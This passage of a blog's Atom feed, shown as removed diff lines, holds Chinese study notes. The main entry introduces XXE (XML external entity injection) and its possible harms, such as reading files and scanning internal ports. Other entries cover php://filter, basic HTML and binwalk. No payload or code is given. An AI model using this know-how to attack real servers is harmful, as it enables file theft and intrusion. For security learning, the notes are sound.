-    <content type="html"><![CDATA[<h4 id="XEE漏洞"><a href="#XEE漏洞" class="headerlink" title="XEE漏洞"></a>XEE漏洞</h4><p>​    这两天看php://liter流的时候注意到，XXE的漏洞，细看之下，通过php流查看文件内容应该是属于这个漏洞的。</p><p>  XXE漏洞，即是<strong>XML外部实体注入。</strong></p><p>当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><p>要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。<strong>另外php版本大于5.4.45的默认不解析外部实体</strong>……</p><a id="more"></a><p>​    将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。</p><p>实际上读取服务器本地文件在web 题中很常见，构造xml代码，一旦有回显的情况，文件目录就几乎很容易看清，就算没有回显，也能通过类似于php流的方法进行写脚本以入侵；</p><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p><p><a href="https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/</a></p><p>**<a href="https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web%20Writeup/</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;XEE漏洞&quot;&gt;&lt;a href=&quot;#XEE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XEE漏洞&quot;&gt;&lt;/a&gt;XEE漏洞&lt;/h4&gt;&lt;p&gt;​    这两天看php://liter流的时候注意到，XXE的漏洞，细看之下，通过php流查看文件内容应该是属于这个漏洞的。&lt;/p&gt;
-&lt;p&gt;  XXE漏洞，即是&lt;strong&gt;XML外部实体注入。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。&lt;/p&gt;
-&lt;p&gt;要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。&lt;strong&gt;另外php版本大于5.4.45的默认不解析外部实体&lt;/strong&gt;……&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="xee漏洞" scheme="http://yoursite.com/tags/xee%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>note-文件包含漏洞php://fiter流浅析</title>
-    <link href="http://yoursite.com/2020/02/23/2.23-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9Ephp-fiter%E6%B5%81%E6%B5%85%E6%9E%90/"/>
-    <id>http://yoursite.com/2020/02/23/2.23-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9Ephp-fiter%E6%B5%81%E6%B5%85%E6%9E%90/</id>
-    <published>2020-02-23T08:39:58.000Z</published>
-    <updated>2020-03-05T08:07:48.122Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2.23-html基础</title>
-    <link href="http://yoursite.com/2020/02/22/2.23-html%E5%9F%BA%E7%A1%80/"/>
-    <id>http://yoursite.com/2020/02/22/2.23-html%E5%9F%BA%E7%A1%80/</id>
-    <published>2020-02-22T09:43:05.000Z</published>
-    <updated>2020-03-05T12:02:47.815Z</updated>
-    
-    <content type="html"><![CDATA[<p>  想自己搭建一些网站环境，所以了解一点html</p><ul><li><html> 与 </html> 之间的文本描述网页</li><li><body> 与 </body> 之间的文本是可见的页面内容</li><li><h1> 与 </h1> 之间的文本被显示为标题</li><li><p> 与 </p> 之间的文本被显示为段落</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;  想自己搭建一些网站环境，所以了解一点html&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;html&gt; 与 &lt;/html&gt; 之间的文本描述网页&lt;/li&gt;
-&lt;li&gt;&lt;body&gt; 与 &lt;/body&gt; 之间的文本是可见的页面内容&lt;/li&gt;
-&lt;li&gt;&lt;h1&gt; 与 &lt;/h1&gt; 之间的文本被显示为标
-      
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="html" scheme="http://yoursite.com/tags/html/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2.22-kali -binwalk</title>
-    <link href="http://yoursite.com/2020/02/22/2.22-kali-binwalk/"/>
-    <id>http://yoursite.com/2020/02/22/2.22-kali-binwalk/</id>
-    <published>2020-02-22T08:12:58.000Z</published>
-    <updated>2020-03-05T15:57:41.824Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="binwalk工具的基本用法"><a href="#binwalk工具的基本用法" class="headerlink" title="binwalk工具的基本用法"></a><strong>binwalk工具的基本用法</strong></h4><p>1.<strong>固件分析扫描</strong></p><p>kali   自带图片隐写工具 steghide</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;binwalk工具的基本用法&quot;&gt;&lt;a href=&quot;#binwalk工具的基本用法&quot; class=&quot;headerlink&quot; title=&quot;binwalk工具的基本用法&quot;&gt;&lt;/a&gt;&lt;strong&gt;binwalk工具的基本用法&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;1.&lt;st
-      
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
-    
-      <category term="binwalk" scheme="http://yoursite.com/tags/binwalk/"/>
     
   </entry>
   
